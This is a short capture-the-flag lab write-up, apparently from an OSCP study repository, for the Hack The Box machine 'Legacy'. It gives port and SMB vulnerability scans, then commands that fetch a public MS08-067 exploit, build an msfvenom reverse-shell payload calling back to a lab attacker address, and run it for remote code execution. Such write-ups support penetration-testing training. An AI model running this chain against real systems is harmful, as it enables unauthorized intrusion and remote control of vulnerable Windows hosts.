## Legacy

Difficulty: Easy

### User and Root Flag

```
rustscan -a 10.10.10.4 --ulimit 5000 -- -A -sV -sC
```

![rustscan](https://github.com/b1d0ws/OSCP/assets/58514930/a9d79b6a-6c9a-498c-8450-9f03b30a79a7)

<br>

We can perform a nmap scan searching for smb vulnerabilities since port 139 and 445 are open.

```
nmap -A --script vuln -p445 10.10.10.4 -T4
```

![nmap](https://github.com/b1d0ws/OSCP/assets/58514930/183c9e34-9050-4308-adf1-45c884353879)

<br>

The machine is vulnerable to ms08-067, so we can search an exploit to this vulnerability.

![searchsploit](https://github.com/b1d0ws/OSCP/assets/58514930/02956b72-21ed-4e8b-b40c-88a53f7332ab)

<br>

Edit the script with our desired shellcode and run it. If occurs python problems I just using [this exploit](https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py) with python3.

```
wget https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py

msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.21 LPORT=1337 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows

python3 ms08-067.py 10.10.10.4 6 445
```

![shellcode](https://github.com/b1d0ws/OSCP/assets/58514930/b9024513-fb92-42c6-a56f-94b2aea3e982)

![exploit](https://github.com/b1d0ws/OSCP/assets/58514930/98baf7c6-69b3-4a47-ad6a-9c3581bb0bc4)
